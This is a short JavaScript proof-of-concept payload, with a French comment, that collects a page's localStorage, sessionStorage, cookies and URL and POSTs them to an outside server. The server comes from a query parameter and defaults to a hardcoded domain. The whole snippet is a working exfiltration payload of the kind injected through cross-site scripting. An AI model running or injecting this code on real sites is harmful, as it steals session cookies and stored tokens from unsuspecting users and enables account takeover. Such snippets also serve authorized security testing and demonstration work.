(function() {
    const dump = {
        localStorage: {...localStorage},
        sessionStorage: {...sessionStorage},
        cookies: document.cookie,
        url: location.href,
        timestamp: new Date().toISOString()
    };

    // Récupère serverOut depuis les query params de la page hébergeant le PoC
    const serverOut = new URLSearchParams(location.search)?.get('serverOut')?? "https://o.g6g.fr";

    fetch(serverOut+'/'+document.domain, {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify(dump)
    });
})();